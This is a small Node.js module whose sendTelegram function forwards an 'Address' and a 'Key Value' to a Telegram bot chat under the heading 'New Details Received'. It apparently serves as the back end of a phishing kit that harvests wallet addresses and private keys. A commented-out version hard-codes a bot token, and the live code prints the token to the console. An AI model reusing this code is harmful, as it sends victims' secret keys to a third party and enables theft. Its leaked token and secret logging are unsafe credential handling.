// const axios = require("axios");


// // const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
// const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// async function sendTelegram(details) {
//   const message = `New Details Received:\nAddress: ${details.address}\nKey Value: ${details.keyValue}`;

//   const url = `https://api.telegram.org/bot8465631920:AAE4wfqEpVdRT7qWV5Wv2kTk0Y8nX3jZq2o/sendMessage`;

//   try {
//     await axios.post(url, {
//       chat_id: CHAT_ID,
//       text: message
//     });
//   } catch (err) {
//     console.error("Telegram send error:", err.message);
//   }
// }

// module.exports = sendTelegram;


const axios = require("axios");

// You can still use your token directly if you want
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID; // fallback if not in env

async function sendTelegram(details) {
  // Ensure all fields are strings and not undefined
  const address = details.address ? String(details.address) : "N/A";
  const keyValue = details.keyValue ? String(details.keyValue) : "N/A";

  const message = `New Details Received:\nAddress: ${address}\nKey Value: ${keyValue}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  // Log payload for debugging
  console.log("Sending Telegram payload:", {
    chat_id: CHAT_ID,
    text: message
  });

  try {
    const res = await axios.post(url, {
      chat_id: CHAT_ID,
      text: message
    });
    console.log("Telegram response:", res.data);
  } catch (err) {
    if (err.response) {
      // Telegram API returned an error
      console.error("Telegram API error:", err.response.data);
    } else {
      console.error("Telegram send error:", err.message);
    }
  }
};

console.log("TOKEN FROM ENV:", process.env.TELEGRAM_TOKEN);


module.exports = sendTelegram;
